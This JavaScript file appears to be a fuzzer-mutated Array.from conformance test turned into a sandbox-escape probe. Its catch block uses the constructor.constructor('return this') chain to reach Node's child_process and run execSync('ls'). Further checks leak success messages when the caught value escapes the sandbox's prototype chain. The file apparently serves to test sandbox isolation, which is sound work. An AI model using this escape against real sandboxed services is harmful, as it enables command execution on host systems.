try {
    var originalArray = [
        0,
        1,
        -2,
        4,
        -8,
        16
    ];
    var array = [
        0,
        1,
        -2,
        4,
        -8,
        16
    ];
    var a = [];
    var arrayIndex = -1;
    function mapFn(value, index) {
        throw () => {
            return () => {
            };
        };
        this.arrayIndex++;
        assert.sameValue(value, array[this.arrayIndex], 'Value mismatch in mapFn at index ' + index + '.');
        assert.sameValue(index, this.arrayIndex, 'Index mismatch in mapFn.');
        array.splice(array.length - 1, 1);
        return 127;
    }
    a = Array.from(array, mapFn, this);
    assert.sameValue(a.length, originalArray.length / 2, 'Length mismatch. Old array : ' + originalArray.length / 2 + '. array : ' + a.length + '.');
    for (var j = 0; j < originalArray.length / 2; j++) {
        assert.sameValue(a[j], 127, 'Element mismatch for mapped array at index ' + j + '.');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}